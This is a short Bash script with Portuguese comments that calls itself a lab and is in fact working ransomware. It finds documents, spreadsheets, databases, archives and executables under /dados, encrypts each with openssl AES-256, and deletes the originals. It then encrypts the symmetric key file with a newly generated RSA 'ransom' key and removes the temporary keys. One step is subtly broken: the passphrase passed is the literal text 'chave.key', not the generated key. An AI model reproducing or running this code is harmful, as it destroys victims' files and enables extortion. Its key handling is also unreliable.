#!/bin/bash
#################################
# Autor: Rafael Vergani 	#
# https://github.com/vergani 	#
# Data: 29/09/2023		#
#################################

# local e extenções de arquivos que serão atacadas neste lab:
volume_alvo=/dados
arquivos=$(find $volume_alvo -print | egrep ".txt|.sql|.xls|.doc|.pdf|.py|.zip|.exe")

#arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)

# variavel que vai armazenar chave privada para decriptar
chave=$(/usr/bin/dbus-uuidgen)

echo $chave > chave.key

# vamos ler todos os arquivos da pasta desejada, exceto arquivos que vou precisar depois:
for file in $arquivos
do
	# agora vamos encriptar tudo usando a chave desejado
	openssl enc -in $file -out $file".cry" -aes-256-cbc -pbkdf2 -k chave.key 
	echo "[+] $file"
	rm $file

done

# vamos gerar um nova chave para proteger minha chave privada necessária para resgate
openssl genrsa -out resgate.pem 4096

# extrair a chave publica que vai ser usada para encriptar a "chave da chave"
openssl rsa -in resgate.pem -outform PEM -pubout -out resgate-pub.pem

# vamos pegar a chave simetrica e encriptar usando a chave publica recém criada
openssl rsautl -in chave.key -out chave.enc -encrypt -pubin -inkey resgate-pub.pem

# remover as chaves temporárias
rm -rf chave.key
rm -rf resgate-pub.pem

# opcional: mover para local seguro remoto a chave privada que decripta a chave de resgate
#mv resgate.pem /home/vergani/
